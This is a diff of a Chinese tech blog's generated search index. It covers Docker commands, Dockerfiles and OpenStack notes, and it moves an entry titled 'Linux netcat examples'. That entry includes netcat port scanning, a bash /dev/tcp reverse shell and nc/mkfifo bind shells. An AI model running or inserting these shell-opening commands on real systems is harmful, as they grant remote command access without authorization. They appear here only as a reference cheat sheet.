@@ -2925,7 +2925,7 @@ From the host try to ping the guest. With the virtual machine configuration desc
 </li>
 <li>docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]<ul>
 <li># 提交指定容器为镜像</li>
-<li>-a, —author=””     Author (e.g., “John Hannibal Smith <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#104;&#97;&#x6e;&#x6e;&#105;&#x62;&#97;&#108;&#x40;&#97;&#x2d;&#x74;&#x65;&#97;&#109;&#x2e;&#99;&#x6f;&#109;">&#104;&#97;&#x6e;&#x6e;&#105;&#x62;&#97;&#108;&#x40;&#97;&#x2d;&#x74;&#x65;&#97;&#109;&#x2e;&#99;&#x6f;&#109;</a>“)</li>
+<li>-a, —author=””     Author (e.g., “John Hannibal Smith <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x68;&#x61;&#x6e;&#x6e;&#x69;&#x62;&#97;&#108;&#x40;&#97;&#45;&#x74;&#101;&#x61;&#109;&#x2e;&#99;&#x6f;&#109;">&#x68;&#x61;&#x6e;&#x6e;&#x69;&#x62;&#97;&#108;&#x40;&#97;&#45;&#x74;&#101;&#x61;&#109;&#x2e;&#99;&#x6f;&#109;</a>“)</li>
 <li>-m, —message=””    Commit message</li>
 <li>-p, —pause=true    Pause container during commit<ul>
 <li># 默认 commit 是暂停状态</li>
@@ -3419,29 +3419,6 @@ From the host try to ping the guest. With the virtual machine configuration desc
     </entry>
     
     <entry>
-      <title><![CDATA[Linux netcat examples]]></title>
-      <url>http://feisky.xyz/2015/02/11/linux-netcat-examples/</url>
-      <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
-<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
-<p>Client: nc 172.31.100.7 1567</p>
-<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
-<p>Server: nc -l 1567 &lt; file.txt </p>
-<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
-<p>Client to Server:</p>
-<p>Server: nc -l 1567 &gt; file.txt</p>
-<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
-<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
-<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
-<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
-<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
-<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
-<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
-<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
-<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
-]]></content>
-    </entry>
-    
-    <entry>
       <title><![CDATA[How to use docker compose to deploy a flask app]]></title>
       <url>http://feisky.xyz/2015/02/11/how-to-use-docker-compose-to-deploy-a-flask-app/</url>
       <content type="html"><![CDATA[<p>The flask app is very simple, you have an index page where your can write and read comments.</p>
@@ -3667,6 +3644,29 @@ ADD static/ /www/static
 <p>Now it’s time for my questions.</p>
 <p>Do I miss something ? Or maybe I could make something better ?</p>
 <p>I like to hear your experiences about how to handle Docker orchestration !</p>
+]]></content>
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Linux netcat examples]]></title>
+      <url>http://feisky.xyz/2015/02/11/linux-netcat-examples/</url>
+      <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
+<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567</p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
+<p>Server: nc -l 1567 &lt; file.txt </p>
+<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
+<p>Client to Server:</p>
+<p>Server: nc -l 1567 &gt; file.txt</p>
+<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
+<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
+<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
+<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
+<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
+<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
+<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
 ]]></content>
     </entry>
     
@@ -6484,7 +6484,7 @@ neutron router-create --ha=<true |="" false=""> router1
 <p><none>              <none>              e01000c7bac8        6 weeks ago         336.5 MB<br>centos              latest              b157b77b1a65        8 weeks ago         243.7 MB<br><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"></div><div class="line">其中，镜像<span class="selector-tag">id</span>唯一标识了镜像，<span class="selector-tag">TAG</span>信息用来标记来自同一个仓库的不同镜像。例如<span class="selector-tag">ubuntu</span>仓库中有多个镜像，通过<span class="selector-tag">TAG</span>信息来区分发行版本，例如10<span class="selector-class">.04</span>、12<span class="selector-class">.04</span>、12<span class="selector-class">.10</span>、13<span class="selector-class">.04</span>、14<span class="selector-class">.04</span>等。创建容器时，如果不指定具体的标记，则默认使用<span class="selector-tag">latest</span>标记信息。</div><div class="line"></div><div class="line">除了从容器中下载已有镜像外，也可以根据已有镜像创建新的镜像。创建新镜像有多种方法：</div><div class="line"></div><div class="line">①修改已有镜像后<span class="selector-tag">commit</span></div></pre></td></tr></table></figure></none></none></p>
 <p>$ sudo docker run -t -i ubuntu:12.04 /bin/bash<br>root@a439b6e894bb:/# apt-get update<br>root@a439b6e894bb:/# apt-get install nginx<br>root@a439b6e894bb:/# /etc/init.d/nginx start<br>root@a439b6e894bb:/# exit<br>$ sudo docker commit -m ‘add ngnix’ -a ‘feisky’ a439b6e894bb ubuntu:nginx<br>0a693112c443ce4fb21bc57a26d67f0648b9415e052f929be7e06701f5f3ca2d<br>$ sudo docker images<br>REPOSITORY                               TAG                 IMAGE ID            CREATED             VIRTUAL SIZE<br>ubuntu                                   nginx               0a693112c443        9 seconds ago       153.1 MB<br>ubuntu                                   12.04               0a51fcc173d8        2 days ago          111 MB<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line"></div><div class="line">②用dockerfile来创建镜像</div><div class="line"></div><div class="line">首先创建一个Dockerfile：</div></pre></td></tr></table></figure></p>
 <p>$ cat Dockerfile </p>
-<h1 id="yet-another-ngnix"><a href="#yet-another-ngnix" class="headerlink" title="yet another ngnix"></a>yet another ngnix</h1><p>FROM ubuntu:12.04<br>MAINTAINER feisky <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x66;&#101;&#x69;&#115;&#107;&#x79;&#x40;&#x72;&#x6f;&#x6f;&#x74;">&#x66;&#101;&#x69;&#115;&#107;&#x79;&#x40;&#x72;&#x6f;&#x6f;&#x74;</a><br>RUN apt-get update<br>RUN apt-get -y install nginx</p>
+<h1 id="yet-another-ngnix"><a href="#yet-another-ngnix" class="headerlink" title="yet another ngnix"></a>yet another ngnix</h1><p>FROM ubuntu:12.04<br>MAINTAINER feisky <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x66;&#x65;&#105;&#115;&#x6b;&#x79;&#64;&#114;&#x6f;&#x6f;&#x74;">&#x66;&#x65;&#105;&#115;&#x6b;&#x79;&#64;&#114;&#x6f;&#x6f;&#x74;</a><br>RUN apt-get update<br>RUN apt-get -y install nginx</p>
 <h1 id="put-my-local-site-to-var-www"><a href="#put-my-local-site-to-var-www" class="headerlink" title="put my local site to /var/www"></a>put my local site to /var/www</h1><p>ADD index.html /var/www/html/</p>
 <h1 id="expose-httpd-port"><a href="#expose-httpd-port" class="headerlink" title="expose httpd port"></a>expose httpd port</h1><p>EXPOSE 80</p>
 <h1 id="the-command-to-run"><a href="#the-command-to-run" class="headerlink" title="the command to run"></a>the command to run</h1><p>CMD [“/usr/sbin/nginx”]</p>
